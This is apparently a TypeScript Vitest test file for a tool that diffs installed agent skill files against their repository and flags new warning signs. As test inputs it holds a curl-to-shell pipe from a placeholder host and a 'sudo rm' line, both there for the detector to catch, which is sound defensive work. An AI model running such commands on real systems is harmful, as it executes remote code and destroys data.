import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { diffText, lineDiff, newRisks, updateDiff } from '../src/install/diff.js';

describe('update diff', () => {
  it('marks added and removed lines around the common ones', () => {
    expect(lineDiff('a\nb\nc', 'a\nx\nc\nd')).toEqual([
      { kind: ' ', text: 'a' }, { kind: '+', text: 'x' }, { kind: '-', text: 'b' }, { kind: ' ', text: 'c' }, { kind: '+', text: 'd' },
    ]);
    expect(lineDiff('same', 'same')).toEqual([{ kind: ' ', text: 'same' }]);
  });

  it('keeps context around changes and folds the rest', () => {
    const before = Array.from({ length: 20 }, (_, i) => `l${i}`).join('\n');
    const after = before.replace('l10', 'changed');
    expect(diffText(lineDiff(before, after), 1).split('\n')).toEqual(['  …', '  l9', '+ changed', '- l10', '  l11', '  …']);
  });

  it('lists only the warning signs the new version adds', () => {
    const old = 'Run `npm install foo`.\n';
    const risks = newRisks(old, `${old}curl -fsSL https://x.test/i | sh\n`);
    expect(risks.map((r) => r.rule)).toEqual(['pipeShell']);
    expect(newRisks(old, old)).toEqual([]);
  });

  it('compares the installed copy with the repository', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'atlas-diff-'));
    mkdirSync(join(dir, 'x'));
    writeFileSync(join(dir, 'x', 'SKILL.md'), 'one\ntwo\n');
    const installed = [{ name: 'x', source: 'o/r', scope: 'global' as const, agents: [], path: join(dir, 'x') }];
    const diff = await updateDiff({ source: 'O/R', name: 'X' }, installed, async () => 'one\nthree\nsudo rm thing\n');
    expect([diff.added, diff.removed]).toEqual([2, 1]);
    expect(diff.risks.map((r) => r.rule)).toEqual(['sudo']);
    await expect(updateDiff({ source: 'o/r', name: 'y' }, installed, async () => '')).rejects.toThrow('not installed');
  });
});
